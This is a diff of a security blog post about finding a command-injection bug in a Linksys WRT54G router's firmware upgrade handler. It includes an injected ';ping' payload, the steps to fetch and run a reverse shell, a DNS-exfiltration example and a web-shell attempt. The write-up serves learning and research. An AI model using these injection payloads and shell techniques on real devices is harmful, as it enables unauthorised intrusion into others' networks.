@@ -1,26 +1,27 @@
 ---
 layout: post
-title:  "Pwning Home Router - Linksys WRT54G"
-date:   2021-05-30
+title: 'Pwning Home Router - Linksys WRT54G'
+date: 2021-05-30
 categories: exploitation
 ---
 
-
 # Preface
+
 A couple of days ago,
 I was looking for a certain cable in one of my drawers where suddenly I stumbled upon a router that was laying around.
-Immediately I wondered..._Could I hack it?_  
+Immediately I wondered..._Could I hack it?_
 
 ![Router Image]
+
 <p style="text-align: center; font-style: italic"><small>"Easy setup" - Perhaps. "Secure"? Not so much.</small></p>
 
 It worked well for me because I was just looking for a new project to pick up on,
 and I had no prior experience in tinkering with such devices and I thought it could be an interesting challenge.
 
 # Getting Started
+
 I connected the router to my computer and right away jumped onto the research.
 I started off with a good ol' port scan in order to get a good grasp of the router's interfaces and my potential attack vectors.
-
 
 ```sh
 ➜  ~ nmap -F 192.169.1.1
@@ -33,6 +34,7 @@ PORT   STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds
 ```
+
 Unsurprisingly, looks like all we got to work with is the web server. Off we go then.
 
 Browsing to the router's website presents a login prompt,
@@ -40,6 +42,7 @@ to which I authenticate with the default credentials,
 and shortly afterwards I'm introduced to the following control and management page.
 
 ![Web Interface]
+
 <p style="text-align: center; font-style: italic"><small>The router's web interface.</small></p>
 
 # Hacking Time
@@ -49,20 +52,23 @@ Initially, I searched for potential inputs from the client when I came across th
 
 I thought it could be a good place to apply the oldest blackbox technique in the book - _Shell Injection_.
 Unfortunately, client-side validation was applied.
+
 <center><video style="width: 480px; height: 495px; margin: 1rem" autoplay loop><source src="https://i.imgur.com/iM8isa8.mp4"></video></center>
 
 In order to overcome it, I intercepted the request using a proxy.
+
 <center><video style="width: 750px; height: 500px; margin: 1rem" autoplay loop><source src="https://i.imgur.com/36pK23Z.mp4"></video></center>
 
 Sadly, it seemed to have no effect at all on the ping request.  
 Needless to say that I also attempted the same on the Traceroute Test interface and many other places but without any luck.
 
 # Getting The Firmware
+
 At this point I was done with doing Blackbox attack variations, mostly because I had no reason to.  
 I decided to download [the firmware], extract the file system, and begin messing around with what's available on the router.
 
 ```sh
-➜  linksys-wrt54g binwalk -e FW_WRT54Gv4_4.21.5.000_20120220.bin 
+➜  linksys-wrt54g binwalk -e FW_WRT54Gv4_4.21.5.000_20120220.bin
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -71,11 +77,12 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 60            0x3C            gzip compressed data, maximum compression, has original file name: "piggy", from Unix, last modified: 2012-02-08 03:40:02
 700660        0xAB0F4         Squashfs filesystem, little endian, version 2.0, size: 2654572 bytes, 502 inodes, blocksize: 65536 bytes, created: 2012-02-08 03:43:28
 
-➜  linksys-wrt54g ls _FW_WRT54Gv4_4.21.5.000_20120220.bin.extracted/squashfs-root 
+➜  linksys-wrt54g ls _FW_WRT54Gv4_4.21.5.000_20120220.bin.extracted/squashfs-root
 bin  dev  etc  lib  mnt  proc sbin tmp  usr  var  www
 ```
 
 Intuitively, I started auditing the source code of the web application, because that's what I could access directly as an attacker.
+
 ```sh
 ➜  squashfs-root ls www
 Backup_Restore.asp    Fail.asp              Forward.asp           PortTriggerTable.asp  SingleForward.asp     Success_u_s.asp       WEP.asp               WanMAC.asp            dyndns.asp            image                 it_help               tzo.asp
@@ -86,13 +93,16 @@ DMZ.asp               FilterSummary.asp     Log_outgoing.asp      RouteTable.asp
 Diagnostics.asp       Filters.asp           Management.asp        Routing.asp           Success.asp           Upgrade.asp           WPA_Preshared.asp     de_help               google_redirect1.asp  index_pptp.asp        sw_help
 Factory_Defaults.asp  Firewall.asp          Ping.asp              SES_Status.asp        Success_s.asp         VPN.asp               WPA_Radius.asp        de_lang_pack          google_redirect2.asp  index_static.asp      sw_lang_pack
 ```
-Basically the web application is a bunch of `.asp` pages served through the `httpd` that is running.  
+
+Basically the web application is a bunch of `.asp` pages served through the `httpd` that is running.
 
 First thing I did was inspect `Ping.asp` in order to see how the ping invocation is done since I wanted to know what failed my shell injection.
 It took me a few minutes to realize that the web application isn't the one that is doing the ping itself as I imagined it would with something like
+
 ```cs
 Process.Start("ping ...");
 ```
+
 But rather what actually happens is that it passes on the request to the `httpd` which handles it.
 
 ```sh
@@ -106,6 +116,7 @@ www/Ping.asp:<FORM name=ping method=<% get_http_method(); %> action=apply.cgi>
 ...
 Binary file usr/sbin/httpd matches
 ```
+
 Consequently, when searching for `/apply.cgi` which is where all the HTTP requests are being sent to,
 the only matches are from the web application with `<FORM>` elements and the `httpd`.
 
@@ -113,21 +124,24 @@ Generally, the sole job of the web application is to pass parameters to the `htt
 I now realized that sooner or later I'd have to reverse the HTTP daemon that is running on the router in order to see how it handles the requests.
 
 # Analyzing HTTP Daemon
+
 I opened up Ghidra, filtered the symbol tree to "ping" and found a function called [`ping_server`].
 ![Ghidra ping_server]
 
 Worth mentioning that none of the binaries that were present within the firmware had any debug symbols, and that they were stripped.
 
-However, with great help of Ghidra's decompiler, although a bit inaccurate, I concluded that what the function does is 
+However, with great help of Ghidra's decompiler, although a bit inaccurate, I concluded that what the function does is
 eventually call a function named `_eval` like so.
 
 ```c
 _eval("ping -c {ping_times} {ping_ip}")
 ```
+
 `ping_times` and `ping_ip` being the arguments that are supplied from the web page which can be seen above.
 
 Naturally, I went on to see how `_eval` handles this input.
 Accordingly, I had to figure out where the symbol is located since it's an imported symbol that does not reside within `httpd` itself.
+
 ```sh
 router-fs$ readelf -d usr/sbin/httpd
 
@@ -145,6 +159,7 @@ router-fs$ nm -gD usr/lib/libnvram.so | grep eval
 router-fs$ nm -gD usr/lib/libshared.so | grep eval
 0000bd28 T _eval
 ```
+
 `_eval` is located within `libshared.so`.
 
 The `_eval` [function itself](https://gist.github.com/elongl/cf5badc6d78721cacbe87dfe59afeef5) is relatively long,
@@ -163,15 +178,17 @@ void _eval(char **param_1,char *param_2,uint param_3,__pid_t *param_4)
     perror(*param_1);
 }
 ```
+
 I tried to see if I could escalate my control via `ping` or `traceroute` with certain arguments but I didn't find anything interesting.
 I also searched for other references within `httpd` to `_eval` in the hope that I'd find a place in which the first argument, the program, is user-controlled.  
 As expected, I couldn't find such a scenario.
 
 # Back To Basics
+
 Well, why not at least _try_ to think simpler than that?  
 Let's begin by searching for references for `system` within `httpd`.
 ![system xrefs]
-There weren't too many in the first place, and all of them were actually safe since an attacker couldn't meddle in between.  
+There weren't too many in the first place, and all of them were actually safe since an attacker couldn't meddle in between.
 
 With the exception of a [single](https://gist.github.com/elongl/e9974c91efcec1a0dc04fc9b639b861d) spot 😮
 
@@ -193,6 +210,7 @@ void do_upgrade_post(void *param_1,BIO *param_2,int param_3)
   ...
 }
 ```
+
 You can see that what happens is that a variable called `puVar1` is formatted into a `cp` command using `snprintf`,
 and then the command is invoked with `system`.
 
@@ -225,10 +243,12 @@ If you paid close attention you noticed that the vulnerable function's name is `
 This must mean that I have to **issue an upgrade** in order to trigger the bug!
 
 A few things I had to do beforehand:
+
 1. Because changing the `ui_language` to an invalid option corrupts the web page,
-I opened up the firmware update page in advance and I'm only switching tabs after changing the language.
+   I opened up the firmware update page in advance and I'm only switching tabs after changing the language.
 
 2. I also needed to encode the command so that it could be properly used within a URL
+
 ```py
 urllib.parse.quote(';ping -c 4 192.169.1.100;')
 -> '%3Bping%20-c%204%20192.169.1.100%3B'
@@ -241,27 +261,33 @@ urllib.parse.quote(';ping -c 4 192.169.1.100;')
 Yes! We got code execution.
 
 I can only assume that the developers didn't think this was susceptible to shell injection since the way
- in which you change a language is via a dropdown and you can't provide free-text on the interface.
+in which you change a language is via a dropdown and you can't provide free-text on the interface.
 
 # Interactive Shell
+
 Although executing commands on the router is great, I still lack an interactive shell which is my true goal.
 
 In order to cope with that, I needed to upload a reverse shell onto the router.  
 Though, how could I upload files?
 Originally, I thought of uploading the file with a command like
+
 ```sh
 echo {revshell_bytes} > revshell
 ```
+
 Though, I then recalled that I couldn't do so due to the size limitation on `snprintf`.
+
 ```c
 // Copies up to 0x40 bytes.
 snprintf(acStack88,0x40,"cp /www/%s_lang_pack/captmp.js /tmp/.",puVar1);
 system(acStack88);
 ```
+
 ```py
 In : 0x40 - len('cp /www/')
 Out: 56 (0x38)
 ```
+
 I'm limited to 56 characters, two of which are the `;` at the beginning and at the end, so essentially 54 characters.
 Uploading it by chunks with `echo {chunk} >> revshell` would take a very long time and I didn't want to go down that path.
 
@@ -272,6 +298,7 @@ I automated the process of changing the `ui_language` to a command in conjunctio
 If everything works correctly, the firmware update request should block since it's now executing the reverse shell (given that it doesn't fork).
 
 Steps:
+
 1. Upload the reverse shell using `wget`.
 2. Make it executable using `chmod +x`.
 3. Running it.
@@ -283,9 +310,11 @@ Sadly, it is clear that after I issue the last firmware upgrade which should inv
 More so, we can see that a shell doesn't open up on our handler.
 
 For the sake of assessing whether the file was uploaded successfully, I used the AND (`&&`) operator.
+
 ```sh
 cat /tmp/X && ping -c 1 192.169.1.100
 ```
+
 If the file was present, I would receive an ICMP packet on my end, else, I wouldn't.
 
 ![Check Revshell Existence]
@@ -296,11 +325,12 @@ Well, what is it then? Why wouldn't it work?
 
 I wanted to be able to get the output from the shell commands that I'm running in order to ease on the debugging process.
 I thought of a couple of ways to do it:
+
 1. Upload a malicious ASP page, _Web Shell_ if you will, and execute commands with the output returned.
 2. Look for files that are displayed within the web interface and write my output to them.
 3. Set myself as the router's DNS server and force the router to issue DNS requests with the command output included.
-For instance, `nslookup $(echo hello).fake.domain`, and then I'd receive a DNS Query request of `hello.fake.domain`.
-However this method is less preferred because extracting the data programmatically from the DNS requests could be quite tedious.
+   For instance, `nslookup $(echo hello).fake.domain`, and then I'd receive a DNS Query request of `hello.fake.domain`.
+   However this method is less preferred because extracting the data programmatically from the DNS requests could be quite tedious.
 
 I started off with the attempt to upload a web shell onto the `www` directory.
 When I browsed to it, the web server replied with `404 Not Found`. I inferred that the web server corresponds to predefined constant paths like `/Ping.asp`,
@@ -317,6 +347,7 @@ I bet that it writes it to a file and that the web server reads from that file.
 I opened my disassembler and looked for strings that contain a `/` indicating a file path, and `ping`.
 ![Ping Log Ghidra]
 That's it! `/tmp/ping.log` must be the one. Let's test it.
+
 ```py
 In [1]: r = Router('192.169.1.1', ('admin', 'waddup'))
 
@@ -324,6 +355,7 @@ In [2]: r._run_shell_cmd('ps', with_output=True)
 [*] Running: ;ps>/tmp/ping.log 2>&1;
 [*] Issuing a firmware upgrade.
 ```
+
 ![Ping Log Output]
 
 Awesome! We can now see the output of our commands.  
@@ -331,6 +363,7 @@ We can even see ourselves with PID 540 🙃
 
 Next thing I did was run `ls /tmp` to ensure the reverse shell is in fact there and is executable,  
 which it was.
+
 ```
 drwxr-xr-x 1 0 0 0 Jan 1 2000 var
 lrwxrwxrwx 1 0 0 8 Jan 1 00:00 ldhclnt -> /sbin/rc
@@ -355,10 +388,12 @@ lrwxrwxrwx 1 0 0 8 Jan 1 00:00 udhcpc -> /sbin/rc
 drwxr-xr-x 1 503 503 76 Feb 8 2012 ..
 drwxr-xr-x 1 0 0 0 Jan 1 2000 .
 ```
+
 I tried running it and I received `SIGSEGV` on my ping log.
 Seems to be that I failed to compile the reverse shell correctly to the target.
 
 # Compiling
+
 It's crucial for me to state that I wanted to be able to compile and run my **own program**.  
 That is why I did not attempt beforehand to deploy a reverse shell using `bash`, `nc`, `python`, `perl`, etc.
 Though, even if I wanted to, none of those were available on the system.
@@ -389,17 +424,16 @@ The repository of the exploit is available [here](https://github.com/elongl/link
 
 Thank you for reading.
 
-
-[Router Image]: https://i.imgur.com/sAmlLfJ.jpg
-[Web Interface]: https://i.imgur.com/QJj9iOA.png
-[Diagnostics Page]: https://i.imgur.com/QctdaYi.png
+[router image]: https://i.imgur.com/sAmlLfJ.jpg
+[web interface]: https://i.imgur.com/QJj9iOA.png
+[diagnostics page]: https://i.imgur.com/QctdaYi.png
 [the firmware]: https://www.linksys.com/us/support-article?articleNum=148648
 [`ping_server`]: https://gist.github.com/elongl/8b42ab42fe82c4a456f26a571dd5276d
-[Ghidra ping_server]: https://i.imgur.com/DijAl9t.png
+[ghidra ping_server]: https://i.imgur.com/DijAl9t.png
 [system xrefs]: https://i.imgur.com/usejiO7.png
 [change ui_language]: https://i.imgur.com/xrNitIn.png
 [reverse shell]: https://github.com/elongl/linksys-wrt54g/blob/master/revshell/revshell.c
-[Check Revshell Existence]: https://i.imgur.com/gVYDd0U.png
-[Ping Log Ghidra]: https://i.imgur.com/znqjVnI.png
-[Ping Log Output]: https://i.imgur.com/1cdJgez.png
+[check revshell existence]: https://i.imgur.com/gVYDd0U.png
+[ping log ghidra]: https://i.imgur.com/znqjVnI.png
+[ping log output]: https://i.imgur.com/1cdJgez.png
 [toolchain]: https://www.linksys.com/us/support-article?articleNum=114663
